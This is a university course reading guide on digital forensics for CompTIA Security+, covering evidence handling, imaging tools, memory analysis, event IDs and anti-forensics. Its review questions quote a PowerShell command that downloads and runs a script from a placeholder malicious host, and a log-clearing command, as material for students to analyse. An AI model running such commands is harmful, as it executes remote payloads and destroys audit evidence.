# Reading Guide: Module 12 — Digital Forensics

## Course: CIS-4328 Information Security

**Certification Alignment:** CompTIA Security+ (SY0-701)

---

## Overview

This reading guide supports the Module 12 video lectures on digital forensics. Forensics content in Security+ focuses on proper evidence handling, key tools, and investigative concepts. Complete all readings before the quiz and lab.

---

## Learning Objectives

By the end of this module, you will be able to:

1. Describe the five phases of the digital forensic process
2. Explain the role of write blockers in forensic evidence preservation
3. Compare forensic disk imaging tools (dd and FTK Imager) and their use cases
4. Describe what memory forensics reveals and name key Volatility framework commands
5. Identify forensically significant Windows Event IDs and Linux log files
6. Explain file system forensic artifacts including timestamps, MFT records, and unallocated space
7. Identify common anti-forensics techniques and their indicators
8. Describe the legal considerations for digital forensics investigations

---

## Assigned Readings (Zero-Cost / Open Access)

### Primary Reading

**NIST SP 800-86 — Guide to Integrating Forensic Techniques into Incident Response**

- Publisher: National Institute of Standards and Technology
- Access: [https://csrc.nist.gov/publications/detail/sp/800-86/final](https://csrc.nist.gov/publications/detail/sp/800-86/final)
- Read: Chapter 2 (Forensic Process Overview), Chapter 3 (Digital Forensics: Data, Media, and Analysis), and Chapter 4 (Network Traffic Analysis)
- Focus areas: forensic phases, evidence types, evidence collection priorities, media analysis

Estimated reading time: 50–60 minutes for assigned chapters.

### Supplemental Reading

**SANS Digital Forensics and Incident Response — Memory Forensics Cheat Sheet**

- Access: [https://www.sans.org/posters/memory-forensics-cheat-sheet/](https://www.sans.org/posters/memory-forensics-cheat-sheet/)
- Read: Full reference card
- Focus areas: Volatility commands, memory artifact types

**FTK Imager User Guide — AccessData (Exterro)**

- Access: [https://support.exterro.com/hc/en-us](https://support.exterro.com/hc/en-us) (search "FTK Imager user guide")
- Read: Sections on creating forensic images and hash verification
- Focus: acquisition workflow, image format selection

**OWASP Logging Cheat Sheet**

- Access: [https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)
- Read: Full document
- Focus areas: what to log, security event logging, log integrity

---

## Key Terms and Definitions

**Digital Forensics** — The application of scientific methods to recover, preserve, analyze, and present digital evidence in support of legal proceedings or organizational investigations.

**Write Blocker** — A hardware or software device that allows read access to storage media while preventing any writes; ensures forensic examination does not modify the original evidence.

**Forensic Image** — A bit-for-bit copy of storage media including all partitions, unallocated space, and deleted file remnants; used in place of original media during analysis.

**dd** — A Unix/Linux command-line tool used to create raw bit-for-bit copies of storage devices; commonly used for forensic imaging.

**FTK Imager** — A free Windows-based forensic imaging tool from AccessData (Exterro) that creates E01 or raw forensic images with built-in hash verification.

**E01 Format** — The Expert Witness Format; the most widely used forensic image format; supports compression, metadata, and splitting into multiple files.

**Hash Verification** — The process of calculating and comparing MD5 and SHA-256 hashes of original media and forensic image to confirm the image is an exact, unmodified copy.

**Dead Acquisition** — Forensic collection from a powered-off system; stable but loses all volatile data.

**Live Acquisition** — Forensic collection from a running system; captures volatile data but risks modifying system state during collection.

**Volatile Evidence** — Evidence that exists only in transient system state (RAM, running processes, network connections) and is lost when the system is powered off.

**Memory Forensics** — Analysis of acquired RAM contents to identify running processes, network connections, encryption keys, credentials, and malware artifacts.

**Volatility Framework** — An open-source Python framework for analyzing memory images; supports Windows, Linux, and macOS memory analysis.

**Fileless Malware** — Malware that executes entirely in memory using legitimate system tools, leaving minimal or no artifacts on disk; detectable primarily through memory forensics.

**MFT (Master File Table)** — A core data structure in NTFS that stores a record for every file and directory on the volume; contains timestamps, file size, and location on disk.

**MAC Times** — Modified, Accessed, and Created/Changed timestamps stored in file system metadata; critical forensic artifacts for timeline reconstruction.

**Timestomping** — An anti-forensics technique where an attacker modifies file timestamps to conceal when files were created or modified.

**File Carving** — A technique for recovering deleted files by scanning storage media for known file headers and footers (magic bytes), without relying on file system metadata.

**Unallocated Space** — Storage space marked as available by the file system; may contain remnants of deleted files that have not yet been overwritten.

**Slack Space** — Space between the end of a file's actual data and the end of its allocated cluster; may contain remnants of previously stored data.

**Prefetch Files** — Windows files stored in `C:\Windows\Prefetch\` that record which executables have run, when they last ran, and how many times; valuable for proving execution of tools.

**Anti-Forensics** — Techniques used by attackers to hide, destroy, or obfuscate digital evidence; includes timestomping, log wiping, secure deletion, encryption, and steganography.

**Steganography** — The practice of hiding data within innocuous files (images, audio, video) to conceal the existence of the hidden data.

**Chain of Custody** — Documentation tracking every person who collected, handled, or accessed evidence; required for evidence admissibility in legal proceedings.

**Expert Witness** — A person qualified to testify in court on technical matters beyond the knowledge of a lay person; forensic analysts often serve as expert witnesses.

---

## Concept Deep Dives

### Forensic Investigation Workflow Summary

For a compromised Windows endpoint, a standard forensic workflow:

1. Photograph scene — before touching anything
2. Document running state — processes, network connections, logged-in users (if live system)
3. Capture RAM — using WinPmem, Magnet RAM Capture, or FTK Imager memory capture
4. Identify storage media — internal and external drives, USB devices
5. Connect storage media through hardware write blocker
6. Hash original media — record MD5 and SHA-256
7. Create forensic image — using FTK Imager or dd
8. Hash forensic image — verify match to original hashes
9. Document all steps in chain of custody
10. Store original media in sealed evidence packaging
11. Analyze forensic image — never the original
12. Document and report findings

### Critical Windows Event IDs — Flashcard Set

Memorize these for the Security+ exam:

| Event ID | Description | Forensic Relevance |
|---|---|---|
| 4624 | Successful logon | Who logged in, from where, at what time |
| 4625 | Failed logon | Brute force / credential stuffing attempts |
| 4648 | Logon with explicit credentials | Pass-the-hash, RunAs, lateral movement |
| 4688 | Process creation | Commands executed, parent/child process relationships |
| 4698/4702 | Scheduled task created/modified | Attacker persistence mechanism |
| 4720 | User account created | Attacker backdoor account |
| 4726 | User account deleted | Covering tracks |
| 7045 | New service installed | Attacker persistence via malicious service |

### Anti-Forensics Detection Table

| Technique | Attacker Goal | Forensic Indicator |
|---|---|---|
| Timestomping | Hide when file was created/placed | Mismatch between $STANDARD_INFORMATION and $FILE_NAME timestamps |
| Log wiping | Eliminate audit trail | Log file gaps, empty log files, Event Log cleared (Event ID 1102) |
| Secure deletion | Prevent file recovery | Tool artifacts (Eraser registry entries), partial file remnants |
| Living off the land | Avoid malware detection | PowerShell logs, WMI event subscriptions, scheduled tasks with suspicious commands |
| Steganography | Hide exfiltrated data | Unusual large images or audio files, tools like `steghide` in execution history |

---

## Security+ Exam Alignment

### Relevant Exam Objectives (SY0-701)

- **4.3** — Given an incident, utilize appropriate data sources to support an investigation (forensic tools, log analysis, order of volatility)
- **4.4** — Given an incident, apply mitigation techniques or controls to secure an environment (forensic preservation concepts)
- **4.5** — Explain the key aspects of digital forensics (write blockers, disk imaging, memory forensics, chain of custody)

### High-Probability Exam Topics from This Module

- Identifying the purpose of a write blocker (prevent modification of evidence)
- Distinguishing dead acquisition from live acquisition
- Knowing that dd creates raw images and FTK Imager supports multiple formats including E01
- Identifying what Volatility's `malfind` plugin detects (injected code / fileless malware)
- Understanding that file carving recovers deleted files from unallocated space
- Recognizing timestomping as an anti-forensics technique
- Knowing that Windows Prefetch files prove program execution even after deletion
- Identifying the Windows Event ID for successful logon (4624)

---

## Review Questions (Self-Check — Not Graded)

1. A forensic investigator needs to analyze a Windows laptop from a suspected insider threat. The laptop is powered off. Describe the correct first three steps before beginning any analysis.

2. An investigator runs `strings` on a forensic memory image and finds the text `IEX (New-Object Net.WebClient).DownloadString('https://malicious.site/payload.ps1')`. What does this indicate and which Volatility plugin might reveal where this string was found in memory?

3. An attacker used Windows' built-in `wevtutil` command to clear the Security event log (`wevtutil cl security`). Is all evidence of their activity gone? What forensic artifacts might remain?

4. During a corporate investigation, a forensic analyst discovers evidence that an employee was also running a cryptocurrency mining operation using company systems. The investigation was authorized only for the original matter (suspected IP theft). What should the analyst do with the newly discovered evidence and why?

5. An organization's IR plan specifies that after an incident, cloud provider logs should be preserved immediately. Fourteen days after the incident is declared, the team tries to retrieve AWS CloudTrail logs only to find they expired. What should the IR plan have included to prevent this?

---

*Texas Wesleyan University | CIS-4328 Information Security | Module 12*
